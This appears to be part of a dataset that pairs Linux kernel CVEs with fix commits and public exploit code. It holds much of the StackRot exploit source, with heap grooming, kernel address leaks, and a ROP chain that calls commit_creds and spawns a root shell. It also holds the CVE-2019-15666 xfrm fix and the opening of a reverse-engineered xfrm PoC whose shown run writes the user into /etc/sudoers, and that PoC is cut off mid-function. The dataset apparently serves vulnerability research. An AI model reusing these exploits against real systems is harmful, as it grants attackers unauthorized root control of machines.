Anyway, I think I want to actually move all the stack expansion code to
a whole new file of its own, rather than have it split up between
mm/mmap.c and mm/memory.c, but since this will have to be backported to
the initial maple tree vma introduction anyway, I tried to keep the
patches _fairly_ minimal.

Also, while I don't think it's valid to expand the stack from GUP, the
final patch in here is a ""warn if some crazy GUP user wants to try to
expand the stack"" patch.  That one will be reverted before the final
release, but it's left to catch any odd cases during the merge window
and release candidates.

Reported-by: Ruihan Li <lrh2000@pku.edu.cn>",https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9471f1f2f50282b9e8f59198ec6bb738b4ccc009,"#include ""../nolibc/nolibc.h""
#include ""../consts/log.h""
#include ""../consts/paging.h""
#include ""../consts/stack.h""
#include ""../consts/msg.h""
#include ""../sys/msg.h""
#include ""../sysutil/clone.h""
#include ""../sysutil/mbarrier.h""
#include ""nodes_decl.h""
#include ""nodes_master_free_use.h""
#include ""nodes_master_and_free.h""
#include ""nodes_master_and_use.h""
#include <linux/wait.h>

#define ADDR_VICTIM ((void *)0x80000UL)
#define SIZE_VICTIM PAGE_SIZE

#define ADDR_GAP (ADDR_VICTIM - 1 * PAGE_SIZE)
#define SIZE_GAP PAGE_SIZE

#define ADDR_GUARD (ADDR_VICTIM - 2 * PAGE_SIZE)
#define SIZE_GUARD PAGE_SIZE

static int setup_maps(void)
{
	void *addr;

	addr = mmap(ADDR_VICTIM, SIZE_VICTIM, PROT_READ | PROT_WRITE,
		    MAP_ANONYMOUS | MAP_PRIVATE | MAP_GROWSDOWN |
			    MAP_FIXED_NOREPLACE,
		    -1, 0);
	if (addr == MAP_FAILED) {
		perror(L_ERROR
		       ""[-] Cannot map upper pages for stack expansion"");
		return -1;
	}

	addr = mmap(ADDR_GUARD, SIZE_GUARD,
		    PROT_READ | PROT_WRITE | MAP_EXECUTABLE,
		    MAP_ANONYMOUS | MAP_PRIVATE | MAP_GROWSDOWN |
			    MAP_FIXED_NOREPLACE,
		    -1, 0);
	if (addr == MAP_FAILED) {
		perror(L_ERROR
		       ""[-] Cannot map lower pages for stack expansion"");
		return -1;
	}

	return 0;
}

static void reset_maps(void)
{
	(void)munmap(ADDR_GAP, SIZE_GAP);
}

#define VMA_MSQNUM 2048
#define VMA_MSQKEY 1234

static int vma_msqids[VMA_MSQNUM];

static void __cleanup_vma_msq(int i)
{
	int retval;

	retval = msgctl(vma_msqids[i], IPC_RMID, NULL);
	if (retval < 0)
		perror(L_ERROR ""[-] Cannot destory VMA message queues"");
}

static void cleanup_vma_msq(void)
{
	int i;

	for (i = 0; i < VMA_MSQNUM; ++i)
		__cleanup_vma_msq(i);
}

static int __setup_vma_msq(int i)
{
	int retval;

	retval = msgget(VMA_MSQKEY + i, IPC_CREAT | 0600);
	if (retval < 0) {
		perror(L_ERROR
		       ""[-] Cannot create message queues to forge VMA structures"");
		return retval;
	}

	vma_msqids[i] = retval;

	return 0;
}

static int setup_vma_msq(void)
{
	int i, retval;

	for (i = 0; i < VMA_MSQNUM; ++i) {
		retval = __setup_vma_msq(i);
		if (retval < 0)
			goto err;
	}

	return 0;
err:
	for (--i; i >= 0; --i)
		__cleanup_vma_msq(i);
	return retval;
}

#define VMA_MSQTYP 1

static char vma_page[PAGE_SIZE];

static int __forge_evil_vma(int i)
{
	struct msg_hdr *hdr;
	int retval;

	hdr = (void *)&vma_page[KERNEL_MSGHDR_SIZE - USERSPACE_MSGHDR_SIZE];
	hdr->type = VMA_MSQTYP;

	retval = msgsnd(vma_msqids[i], hdr, PAGE_SIZE - KERNEL_MSGHDR_SIZE, 0);
	if (retval < 0) {
		perror(L_ERROR
		       ""[-] Cannot send evil VMA structures to message queues"");
		return retval;
	}

	return 0;
}

static int forge_evil_vma(void)
{
	int i, retval;

	for (i = 0; i < VMA_MSQNUM; ++i) {
		retval = __forge_evil_vma(i);
		if (retval < 0)
			return retval;
	}

	return 0;
}

#define NODE_NUM 256

static pid_t nodes[NODE_NUM];

static void __kill_node(pid_t pid, int sig)
{
	int retval;

	retval = kill(pid, sig);
	if (retval < 0)
		perror(L_ERROR ""[-] Cannot kill nodes"");
}

static void kill_node(int i, int sig)
{
	pid_t pid = nodes[i];

	if (!pid) {
		fputs(L_ERROR
		      ""Internal error: Trying to kill an invalid node\n"",
		      stderr);
		return;
	}

	__kill_node(pid, sig);
}

static void __wait_node(pid_t pid)
{
	int retval;

	retval = waitpid(pid, NULL, __WCLONE);
	if (retval < 0)
		perror(L_ERROR ""[-] Cannot wait for nodes"");
}

static void __clear_node(int i)
{
	nodes[i] = 0;
}

static void wait_node(int i)
{
	pid_t pid = nodes[i];

	if (!pid) {
		fputs(L_ERROR
		      ""Internal error: Trying to wait for an invalid node\n"",
		      stderr);
		return;
	}

	__wait_node(pid);
	__clear_node(i);
}

static void __teardown_node(pid_t pid)
{
	__kill_node(pid, SIGKILL);
	__wait_node(pid);
}

static void __teardown_node_at(int i)
{
	pid_t pid;

	pid = nodes[i];
	if (pid != 0) {
		__teardown_node(pid);
		__clear_node(i);
	}
}

static void teardown_nodes(void)
{
	int i;

	for (i = 0; i < NODE_NUM; ++i)
		__teardown_node_at(i);
}

static char node_free_stack[COMMON_STACK_SIZE] STACK_ALIGNED;

static int vma_create_node(int i)
{
	pid_t pid;

	pid = clone_new_vm(&run_node_free, node_free_stack, COMMON_STACK_SIZE);
	if (pid < 0) {
		perror(L_ERROR ""[-] Cannot create the \""free\"" node"");
		return pid;
	}

	nodes[i] = pid;

	return 0;
}

static int setup_nodes(void)
{
	int i;
	int result;

	for (i = 0; i < NODE_NUM; ++i) {
		result = vma_create_node(i);
		if (result < 0)
			goto err;
	}

	return 0;
err:
	for (--i; i >= 0; --i)
		__teardown_node_at(i);

	return result;
}

#define OBJS_PER_SLAB 16

static void prepare_fengshui(void)
{
	int mod;
	int i;

	mod = (NODE_NUM - 1) % OBJS_PER_SLAB;

	for (i = NODE_NUM - 1; i >= 0; --i) {
		if (i % OBJS_PER_SLAB == mod)
			continue;

		kill_node(i, SIGKILL);
	}

	for (i = NODE_NUM - 1; i >= 0; --i) {
		if (i % OBJS_PER_SLAB == mod)
			continue;

		wait_node(i);
	}
}

#define LUCKY_TASK_ID 223

static int check_nodes(void)
{
	int i;

	for (i = 1; i < NODE_NUM; ++i) {
		if (nodes[i] == nodes[i - 1] + 1)
			continue;
		fprintf(stderr,
			L_ERROR
			""[-] Spaced PIDs (caused by background services?): ""
			""[%d] = %d, [%d] = %d\n"",
			i - 1, nodes[i - 1], i, nodes[i]);
		return -1;
	}

	return 0;
}

static int verify_healthcheck_state(void)
{
	if (healthcheck_state != HEALTHCHECK_DONE) {
		fputs(L_ERROR
		      ""[-] Healthcheck failed: \""Use\"" happens before \""free\"", ""
		      ""please try to enlarge LONG_FILE_NAME_DEPTH\n"",
		      stderr);
		return -1;
	}

	fputs(L_DONE ""[+] Healcheck passed: \""Use\"" happens after \""free\""\n"",
	      stderr);
	return 0;
}

static int warn_healthcheck_state(void)
{
	if (healthcheck_state == HEALTHCHECK_DONE)
		return 0;

	fputs(L_ERROR
	      ""[-] Healthcheck says \""use\"" happens before \""free\"", aborting\n"",
	      stderr);
	return -1;
}

static int __do_exp(void)
{
	int retval;

	fprintf(stderr, L_DOING ""[ ] Trying with free_timing_msec=%d\n"",
		free_timing_msec);

	healthcheck_state = HEALTHCHECK_INIT;
	reset_maps();

	sched_yield();
retry:
	retval = setup_nodes();
	if (retval < 0)
		return retval;

	if (check_nodes() != 0) {
		teardown_nodes();
		sched_yield();
		goto retry;
	}

	prepare_fengshui();

	retval = waitpid(nodes[LUCKY_TASK_ID], NULL, __WCLONE | WSTOPPED);
	if (retval < 0)
		perror(L_ERROR ""[-] Cannot wait for the \""free\"" node"");

	kill_node(LUCKY_TASK_ID, SIGCONT);
	wait_node(LUCKY_TASK_ID);

	teardown_nodes();

	if (free_timing_msec == 0)
		return verify_healthcheck_state();
	else
		return warn_healthcheck_state();
}

#define FREE_TIMING_INIT  50
#define FREE_TIMING_RATIO 5
#define FREE_TIMING_STEP  5

static int __do_first_exp(void)
{
	int retval;
	int msec;

	free_timing_msec = 0;
	retval = __do_exp();
	if (retval < 0)
		return retval;

	for (msec = FREE_TIMING_INIT;; msec += msec / FREE_TIMING_RATIO) {
		free_timing_msec = msec;
		retval = __do_exp();
		if (retval < 0)
			return retval;
		if (exploit_results[0] != 0)
			return 0;
	}
}

static int __do_next_exp(void)
{
	int retval;
	int msec, initial_timing;

	initial_timing = free_timing_msec;

	for (msec = 0;; msec += FREE_TIMING_STEP) {
		free_timing_msec = initial_timing + msec;
		retval = __do_exp();
		if (retval < 0)
			return retval;
		if (exploit_results[0] != 0)
			return 0;

		if (msec == 0 || msec > initial_timing)
			continue;

		free_timing_msec = initial_timing - msec;
		retval = __do_exp();
		if (retval < 0)
			return retval;
		if (exploit_results[0] != 0)
			return 0;
	}
}

static int do_exp(unsigned long target_address)
{
	exploit_address = target_address;
	stack_expansion_victim = ADDR_VICTIM - 1;

	exploit_results[0] = 0;

	if (free_timing_msec == 0)
		return __do_first_exp();
	else
		return __do_next_exp();
}

#define IDT_BASE_ADDR  0xfffffe0000000000ul
#define IDT_ENTRY_SIZE 16
#define IDT_ENTRY_NUM  256

#define IDT_LAST_ENTRY (IDT_BASE_ADDR + (IDT_ENTRY_NUM - 1) * IDT_ENTRY_SIZE)

static unsigned long leaked_code_addr;

static int __exp_leak_code(void)
{
	unsigned long v0, v1, v;
	int retval;

	retval = do_exp(IDT_LAST_ENTRY);
	if (retval < 0)
		return retval;

	v0 = exploit_results[0];
	v1 = exploit_results[1];
	v = (v0 & 0xFFFF) | ((v0 >> 32) & (0xFFFF0000)) | (v1 << 32);

	fprintf(stderr, L_DONE ""[+] Leaked code address: %lx\n"", v);
	leaked_code_addr = v;

	return 0;
}

#define __OFF_asm_sysvec_spurious_apic_interrupt 0xffffffff81e00cd0
#define __OFF_node_data				 0xffffffff82814ea0

static unsigned long leaked_heap_addr;

static int __exp_leak_heap(void)
{
	unsigned long v;
	int retval;

	v = leaked_code_addr - __OFF_asm_sysvec_spurious_apic_interrupt +
	    __OFF_node_data;
	retval = do_exp(v);
	if (retval < 0)
		return retval;

	v = exploit_results[0];

	fprintf(stderr, L_DONE ""[+] Leaked heap address: %lx\n"", v);
	leaked_heap_addr = v;

	return 0;
}

extern void get_shell(void);

asm("".section .rodata\n\t""
    ""msg: .string \"""" A_SUCC ""[*] Got root! ""
    ""Run /tmp/exp/as_root.sh\\n"" A_RESET ""\""\n\t""
    ""msg_end:\n\t""
    ""\n\t""
    ""sh_cmd: .string \""/tmp/exp/as_root.sh\""\n\t""
    ""sh_arg: .quad sh_cmd\n\t""
    ""        .quad 0\n\t""
    ""\n\t""
    "".section .text\n\t""
    ""get_shell:\n\t""
    ""movq $1, %rax\n\t"" /* __NR_write */
    ""movq $2, %rdi\n\t"" /* stderr */
    ""leaq msg(%rip), %rsi\n\t""
    ""movq $msg_end - msg, %rdx\n\t""
    ""syscall\n\t""
    ""movq $59, %rax\n\t"" /* __NR_execve */
    ""leaq sh_cmd(%rip), %rdi\n\t""
    ""leaq sh_arg(%rip), %rsi\n\t""
    ""xorq %rdx, %rdx\n\t""
    ""syscall\n\t""
    ""ud2\n\t"");

static unsigned long page_kernel_addr;
static void *page_userspace_ptr;

static unsigned long kcode_base_addr;
static unsigned long curr_stack_offset;

static void __exp_rop_entry(void)
{
#define WR_ABS(off, val) \
	(*(unsigned long *)(page_userspace_ptr + (off)) = (val))
#define WR_REL(off, val)                                  \
	(*(unsigned long *)(page_userspace_ptr + (off)) = \
		 page_kernel_addr + (val))
#define WR_SYM(off, val)                                  \
	(*(unsigned long *)(page_userspace_ptr + (off)) = \
		 kcode_base_addr + (val))

	WR_REL(96 /* vma_area_struct->vm_ops */, -8 /* vm_ops */);

	WR_SYM(-8 /* vm_ops */ + 96 /* vma_ops->name */,
	       0xffffffff8122e544 /* movq %rbx, %rsi;
				   * movq %rbp, %rdi;
				   * call ffffffff82003260 <__x86_indirect_thunk_r13> */);

	WR_SYM(16 /* indirect jump: %r13 (vma_area_struct->mm) */,
	       0xffffffff81b828a4 /* pushq %rsi; jmp 46(%rsi) */);

	WR_SYM(46 /* indirect jump: 46(%rsi) */,
	       0xffffffff8195b260 /* popq %rsp; ret */);

	WR_SYM(0 /* stack(%rsp=%rdi): ret */,
	       0xffffffff8195b260 /* popq %rsp; ret */);

	WR_REL(8 /* stack(%rsp): popq %rsp */, 128 /* new stack */);

	curr_stack_offset = 128;

#define ST_ABS(val)                                                           \
	(*(unsigned long *)(page_userspace_ptr + curr_stack_offset) = (val)); \
	curr_stack_offset += 8
#define ST_REL(val)                                                   \
	(*(unsigned long *)(page_userspace_ptr + curr_stack_offset) = \
		 page_kernel_addr + curr_stack_offset + (val));       \
	curr_stack_offset += 8
#define ST_SYM(val)                                                   \
	(*(unsigned long *)(page_userspace_ptr + curr_stack_offset) = \
		 kcode_base_addr + (val));                            \
	curr_stack_offset += 8
}

static void __exp_rop_cred(void)
{
	ST_SYM(0xffffffff81021465 /* popq %rdi; ret */);

	ST_SYM(0xffffffff82814a40 /* init_task */);

	ST_SYM(0xffffffff8109ba00 /* prepare_kernel_cred */);

	ST_SYM(0xffffffff81021465 /* popq %rdi; ret */);

	ST_REL(24 /* %rsp + 24 */);

	ST_SYM(0xffffffff814219af /* movq %rax, (%rdi);
				   * jmp ffffffff82003300 <__x86_return_thunk> */);

	ST_SYM(0xffffffff81021465 /* popq %rdi; ret */);

	ST_ABS(0xAABBCCDD /* dummy value */);

	ST_SYM(0xffffffff8109b760 /* commit_creds */);
}

static void __exp_rop_nsproxy(void)
{
	ST_SYM(0xffffffff81021465 /* popq %rdi; ret */);

	ST_ABS(1 /* pid */);

	ST_SYM(0xffffffff81094140 /* find_task_by_vpid */);

	ST_SYM(0xffffffff81021465 /* popq %rdi; ret */);

	ST_REL(24 /* %rsp + 24 */);

	ST_SYM(0xffffffff814219af /* movq %rax, (%rdi);
				   * jmp ffffffff82003300 <__x86_return_thunk> */);

	ST_SYM(0xffffffff81021465 /* popq %rdi; ret */);

	ST_ABS(0xAABBCCDD /* dummy value */);

	ST_SYM(0xffffffff810aa0ed /* popq %rsi; ret */);

	ST_SYM(0xffffffff828517a0 /* init_nsproxy */);

	ST_SYM(0xffffffff81099cb0 /* switch_task_namespaces */);
}

static void __exp_rop_unlock(void)
{
	ST_SYM(0xffffffff81123074 /* popq %rax; ret */);

	ST_SYM(0xffffffff81123074 /* popq %rax; ret */);

	ST_SYM(0xffffffff81002cf4 /* movq %rbp, %rdi;
				   * call 0xffffffff820030c0 <__x86_indirect_thunk_array> */);

	ST_SYM(0xffffffff812b1240 /* m_stop */);
}

static void __exp_rop_exit(void)
{
	ST_SYM(0xffffffff81e00ed0 /* swapgs_restore_regs_and_return_to_usermo */);

	ST_ABS(0 /* r15 */);
	ST_ABS(0 /* r14 */);
	ST_ABS(0 /* r13 */);
	ST_ABS(0 /* r12 */);
	ST_ABS(0 /* rbp */);
	ST_ABS(0 /* rbx */);
	ST_ABS(0 /* r11 */);
	ST_ABS(0 /* r10 */);
	ST_ABS(0 /* r9 */);
	ST_ABS(0 /* r8 */);
	ST_ABS(0 /* rax */);
	ST_ABS(0 /* rcx */);
	ST_ABS(0 /* rdx */);
	ST_ABS(0 /* rsi */);
	ST_ABS(0 /* rdi */);

	ST_ABS(0 /* ??? */);
	ST_ABS((unsigned long)&get_shell /* rip */);
	ST_ABS(0x33 /* cs */);
	ST_ABS(0x246 /* eflags */);
	ST_ABS(0xCCCC1234 /* rsp */);
	ST_ABS(0x2b /* ss */);
}

static void __exp_prep_rop(void)
{
	kcode_base_addr =
		leaked_code_addr - __OFF_asm_sysvec_spurious_apic_interrupt;

	__exp_rop_entry();

	__exp_rop_cred();

	__exp_rop_nsproxy();

	__exp_rop_unlock();

	__exp_rop_exit();
}

#define ROP_OFFSET 0x100

static int __exp_kern_exec(void)
{
	int retval;

	page_kernel_addr = (leaked_heap_addr & ~PAGE_MASK) + ROP_OFFSET;
	page_userspace_ptr = &vma_page[ROP_OFFSET];

	__exp_prep_rop();

	retval = forge_evil_vma();
	if (retval < 0)
		return retval;

	retval = do_exp(page_kernel_addr);
	if (retval < 0)
		return retval;

	return 0;
}

#define PAUSE_MSEC 200

static int do_exploiting(void)
{
	int retval;

	msleep(PAUSE_MSEC);
	retval = __exp_leak_code();
	if (retval < 0)
		return retval;

	msleep(PAUSE_MSEC);
	retval = __exp_leak_heap();
	if (retval < 0)
		return retval;

	setup_nodes();
	teardown_nodes();
	synchronize_rcu();

	msleep(PAUSE_MSEC);
	retval = __exp_kern_exec();
	if (retval < 0)
		return retval;

	return 0;
}

static int run_node_master(void)
{
	int retval;

	retval = setup_maps();
	if (retval < 0)
		return retval;

	retval = setup_vma_msq();
	if (retval < 0)
		return retval;

	retval = do_exploiting();

	cleanup_vma_msq();

	return retval;
}

",https://github.com/lrh2000/StackRot/tree/master,,,
CVE-2019-15666,https://nvd.nist.gov/vuln/detail/CVE-2019-15666,"An issue was discovered in the Linux kernel before 5.0.19. There is an out-of-bounds array access in __xfrm_policy_unlink, which will cause denial of service, because verify_newpolicy_info in net/xfrm/xfrm_user.c mishandles directory validation.","xfrm: policy: Fix out-of-bound array accesses in __xfrm_policy_unlink
UBSAN report this:

UBSAN: Undefined behaviour in net/xfrm/xfrm_policy.c:1289:24
index 6 is out of range for type 'unsigned int [6]'
CPU: 1 PID: 0 Comm: swapper/1 Not tainted 4.4.162-514.55.6.9.x86_64+ #13
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
 0000000000000000 1466cf39b41b23c9 ffff8801f6b07a58 ffffffff81cb35f4
 0000000041b58ab3 ffffffff83230f9c ffffffff81cb34e0 ffff8801f6b07a80
 ffff8801f6b07a20 1466cf39b41b23c9 ffffffff851706e0 ffff8801f6b07ae8
Call Trace:
 <IRQ>  [<ffffffff81cb35f4>] __dump_stack lib/dump_stack.c:15 [inline]
 <IRQ>  [<ffffffff81cb35f4>] dump_stack+0x114/0x1a0 lib/dump_stack.c:51
 [<ffffffff81d94225>] ubsan_epilogue+0x12/0x8f lib/ubsan.c:164
 [<ffffffff81d954db>] __ubsan_handle_out_of_bounds+0x16e/0x1b2 lib/ubsan.c:382
 [<ffffffff82a25acd>] __xfrm_policy_unlink+0x3dd/0x5b0 net/xfrm/xfrm_policy.c:1289
 [<ffffffff82a2e572>] xfrm_policy_delete+0x52/0xb0 net/xfrm/xfrm_policy.c:1309
 [<ffffffff82a3319b>] xfrm_policy_timer+0x30b/0x590 net/xfrm/xfrm_policy.c:243
 [<ffffffff813d3927>] call_timer_fn+0x237/0x990 kernel/time/timer.c:1144
 [<ffffffff813d8e7e>] __run_timers kernel/time/timer.c:1218 [inline]
 [<ffffffff813d8e7e>] run_timer_softirq+0x6ce/0xb80 kernel/time/timer.c:1401
 [<ffffffff8120d6f9>] __do_softirq+0x299/0xe10 kernel/softirq.c:273
 [<ffffffff8120e676>] invoke_softirq kernel/softirq.c:350 [inline]
 [<ffffffff8120e676>] irq_exit+0x216/0x2c0 kernel/softirq.c:391
 [<ffffffff82c5edab>] exiting_irq arch/x86/include/asm/apic.h:652 [inline]
 [<ffffffff82c5edab>] smp_apic_timer_interrupt+0x8b/0xc0 arch/x86/kernel/apic/apic.c:926
 [<ffffffff82c5c985>] apic_timer_interrupt+0xa5/0xb0 arch/x86/entry/entry_64.S:735
 <EOI>  [<ffffffff81188096>] ? native_safe_halt+0x6/0x10 arch/x86/include/asm/irqflags.h:52
 [<ffffffff810834d7>] arch_safe_halt arch/x86/include/asm/paravirt.h:111 [inline]
 [<ffffffff810834d7>] default_idle+0x27/0x430 arch/x86/kernel/process.c:446
 [<ffffffff81085f05>] arch_cpu_idle+0x15/0x20 arch/x86/kernel/process.c:437
 [<ffffffff8132abc3>] default_idle_call+0x53/0x90 kernel/sched/idle.c:92
 [<ffffffff8132b32d>] cpuidle_idle_call kernel/sched/idle.c:156 [inline]
 [<ffffffff8132b32d>] cpu_idle_loop kernel/sched/idle.c:251 [inline]
 [<ffffffff8132b32d>] cpu_startup_entry+0x60d/0x9a0 kernel/sched/idle.c:299
 [<ffffffff8113e119>] start_secondary+0x3c9/0x560 arch/x86/kernel/smpboot.c:245

The issue is triggered as this:

xfrm_add_policy
    -->verify_newpolicy_info  //check the index provided by user with XFRM_POLICY_MAX
         //In my case, the index is 0x6E6BB6, so it pass the check.
    -->xfrm_policy_construct  //copy the user's policy and set xfrm_policy_timer
    -->xfrm_policy_insert
 --> __xfrm_policy_link //use the orgin dir, in my case is 2
 --> xfrm_gen_index   //generate policy index, there is 0x6E6BB6

then xfrm_policy_timer be fired

xfrm_policy_timer
   --> xfrm_policy_id2dir  //get dir from (policy index & 7), in my case is 6
   --> xfrm_policy_delete
      --> __xfrm_policy_unlink //access policy_count[dir], trigger out of range access

Add xfrm_policy_id2dir check in verify_newpolicy_info, make sure the computed dir is
valid, to fix the issue.

Reported-by: Hulk Robot <hulkci@huawei.com>
Fixes: e682adf021be (""xfrm: Try to honor policy index if it's supplied by user"")
Signed-off-by: YueHaibing <yuehaibing@huawei.com>
Acked-by: Herbert Xu <herbert@gondor.apana.org.au>
Signed-off-by: Steffen Klassert <steffen.klassert@secunet.com>
Diffstat
-rw-r--r-- net/xfrm/xfrm_user.c 2 
1 files changed, 1 insertions, 1 deletions
diff --git a/net/xfrm/xfrm_user.c b/net/xfrm/xfrm_user.c
index a131f9ff979e1b..8d4d52fd457b27 100644
--- a/net/xfrm/xfrm_user.c
+++ b/net/xfrm/xfrm_user.c
@@ -1424,7 +1424,7 @@ static int verify_newpolicy_info(struct xfrm_userpolicy_info *p)
  ret = verify_policy_dir(p->dir);
  if (ret)
   return ret;
- if (p->index && ((p->index & XFRM_POLICY_MAX) != p->dir))
+ if (p->index && (xfrm_policy_id2dir(p->index) != p->dir))
   return -EINVAL;
 
  return 0;",https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b805d78d300bcf2c83d6df7da0c818b0fee41427,"/*
 * RE
 * Original binary file: https://github.com/duasynt/xfrm_poc/blob/master/lucky0
 * This poc is written by Vitaly Nikolenko @vnik5287
 *
 * Tested on CentOS8 4.18.0-80.11.2.el8_0.x86_64
 * [test@localhost Desktop]$ gcc lucky0_RE.c -lpthread
 *
 * [test@localhost Desktop]$ while true; do ./a.out && break; done
 * [-] failed
 * [-] failed
 * [-] failed
 * running get_root
 * [+] current user test was added to /etc/sudoers
 * [+] get_root done
 *
 * [test@localhost Desktop]$ sudo su
 * [root@localhost Desktop]# id
 * uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 *
 * [root@localhost Desktop]# uname -a
 * Linux localhost.localdomain 4.18.0-80.11.2.el8_0.x86_64 #1 SMP Tue Sep 24 11:32:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 *
 * [root@localhost Desktop]# cat /etc/redhat-release
 * CentOS Linux release 8.1.1911 (Core)
 * [root@localhost Desktop]#
 *
 * Compile:
 * gcc lucky0_RE.c -lpthread
 *
 * Execute:
 * while true; do ./a.out && break; done
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <linux/xfrm.h>
#include <linux/netlink.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <linux/pfkeyv2.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <semaphore.h>
#include <pthread.h>
#include <sys/wait.h>
#include <linux/userfaultfd.h>
#include <pwd.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/poll.h>
#include <sys/ioctl.h>
#include <sys/xattr.h>

static int write_file(const char* file, const char* what, ...)
{
 char buf[1024];
 va_list args;
 va_start(args, what);
 vsnprintf(buf, sizeof(buf), what, args);
 va_end(args);
 buf[sizeof(buf) - 1] = 0;
 int len = strlen(buf);

 int fd = open(file, O_WRONLY | O_CLOEXEC);
 if (fd == -1)
  return 0;
 if (write(fd, buf, len) != len) {
  close(fd);
  return 0;
 }
 close(fd);
 return 1;
}

void setup_sandbox()
{
 int real_uid = getuid();
 int real_gid = getgid();

        if (unshare(CLONE_NEWUSER) != 0) {
  perror(""unshare(CLONE_NEWUSER)"");
  exit(EXIT_FAILURE);
 }

        if (unshare(CLONE_NEWNET) != 0) {
  perror(""unshare(CLONE_NEWUSER)"");
  exit(EXIT_FAILURE);
 }

 if (!write_file(""/proc/self/setgroups"", ""deny"")) {
  perror(""write_file(/proc/self/set_groups)"");
  exit(EXIT_FAILURE);
 }
 if (!write_file(""/proc/self/uid_map"", ""0 %d 1\n"", real_uid)){
  perror(""write_file(/proc/self/uid_map)"");
  exit(EXIT_FAILURE);
 }
 if (!write_file(""/proc/self/gid_map"", ""0 %d 1\n"", real_gid)) {
  perror(""write_file(/proc/self/gid_map)"");
  exit(EXIT_FAILURE);
 }

 cpu_set_t my_set;
 CPU_ZERO(&my_set);
 CPU_SET(0, &my_set);
 if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
  perror(""sched_setaffinity()"");
  exit(EXIT_FAILURE);
 }

 if (system(""/sbin/ifconfig lo up"") != 0) {
  perror(""system(/sbin/ifconfig lo up)"");
  exit(EXIT_FAILURE);
 }

 printf(""[+] namespace sandbox setup successfully\n"");
}

int bind_on_cpu(int num)
{
 cpu_set_t cpu;
 CPU_ZERO(&cpu);
 CPU_SET(num, &cpu);
 if (sched_setaffinity(syscall(SYS_gettid), sizeof(cpu), &cpu) == -1) {
  perror(""sched_setaffinity"");
  return -1;
 }

 CPU_ZERO(&cpu);
 if (sched_getaffinity(syscall(SYS_gettid), sizeof(cpu), &cpu) == -1) {
  perror(""sched_getaffinity"");
  return -1;
 }

 if (!CPU_ISSET(num, &cpu))
  return -1;

 return 0;
}

#define MAX_PAYLOAD 512

int xfrm_new_policy0(void)
{
 int err;

 struct msghdr mh;
 struct iovec iov;
 struct nlmsghdr *nlm = malloc(NLMSG_SPACE(MAX_PAYLOAD));
 memset(nlm, 0, NLMSG_SPACE(MAX_PAYLOAD));
 memset(&mh, 0, sizeof(mh));

 nlm->nlmsg_type = XFRM_MSG_UPDPOLICY;
 nlm->nlmsg_flags = NLM_F_REQUEST;
 nlm->nlmsg_pid = 0;

 char *p = NULL;
 /* DATA: xfrm_userpolicy_info */
 struct xfrm_userpolicy_info xupi;
 memset(&xupi, 0, sizeof(xupi));
 xupi.share = XFRM_SHARE_ANY;
 xupi.action = XFRM_POLICY_ALLOW;
 xupi.dir = XFRM_POLICY_IN;
 xupi.index = 0;
 xupi.priority = 0;
 xupi.sel.family = AF_INET;
 //xupi.lft.hard_add_expires_seconds = 9;
 memcpy(NLMSG_DATA(nlm), &xupi, sizeof(xupi));
 p = NLMSG_DATA(nlm) + sizeof(xupi);

 nlm->nlmsg_len = p - (char *)nlm;

 iov.iov_base = (void *)nlm;
 iov.iov_len = nlm->nlmsg_len;
 mh.msg_iov = &iov;
 mh.msg_iovlen = 1;

 int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
 err = sendmsg(fd, &mh, 0);
 if (err == -1) {
  free(nlm);
  return -1;
 }

 free(nlm);
 return 0;
}

int xfrm_new_policy1(void)
{
 int err;

 struct msghdr mh;
 struct iovec iov;
 struct nlmsghdr *nlm = malloc(NLMSG_SPACE(MAX_PAYLOAD));
 memset(nlm, 0, NLMSG_SPACE(MAX_PAYLOAD));
 memset(&mh, 0, sizeof(mh));

 nlm->nlmsg_type = XFRM_MSG_UPDPOLICY;
 nlm->nlmsg_flags = NLM_F_REQUEST;
 nlm->nlmsg_pid = 0;

 char *p = NULL;
 /* DATA: xfrm_userpolicy_info */
 struct xfrm_userpolicy_info xupi;
 memset(&xupi, 0, sizeof(xupi));
 xupi.share = XFRM_SHARE_ANY;
 xupi.action = XFRM_POLICY_ALLOW;
 xupi.dir = XFRM_POLICY_IN;
 xupi.index = 260;
 xupi.priority = 1;
 xupi.sel.family = AF_INET;
 //xupi.lft.hard_add_expires_seconds = 9;
 memcpy(NLMSG_DATA(nlm), &xupi, sizeof(xupi));
 p = NLMSG_DATA(nlm) + sizeof(xupi);

#if 0
 /* ATTR: XFRM_POLICY_TYPE */
 struct nlattr nla;
 struct xfrm_userpolicy_type upt;
 memset(&nla, 0, sizeof(nla));
 memset(&upt, 0, sizeof(upt));
 nla.nla_len = sizeof(upt) + sizeof(nla);
 nla.nla_type = XFRMA_POLICY_TYPE;
 upt.type = XFRM_POLICY_TYPE_SUB; /* the type we set index 0 */
 memcpy(p, &nla, sizeof(nla));
 p += sizeof(nla);
 memcpy(p, &upt, sizeof(upt));
 p += sizeof(upt);
#endif

 nlm->nlmsg_len = p - (char *)nlm;

 iov.iov_base = (void *)nlm;
 iov.iov_len = nlm->nlmsg_len;
 mh.msg_iov = &iov;
 mh.msg_iovlen = 1;

 int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
 err = sendmsg(fd, &mh, 0);
 if (err == -1) {
  free(nlm);
  return -1;
 }

 free(nlm);
 return 0;
}

int xfrm_hash_rebuild(void)
{
 int err;

 struct msghdr mh;
 struct iovec iov;
 struct nlmsghdr *nlm = malloc(NLMSG_SPACE(MAX_PAYLOAD));
 memset(nlm, 0, NLMSG_SPACE(MAX_PAYLOAD));
 memset(&mh, 0, sizeof(mh));

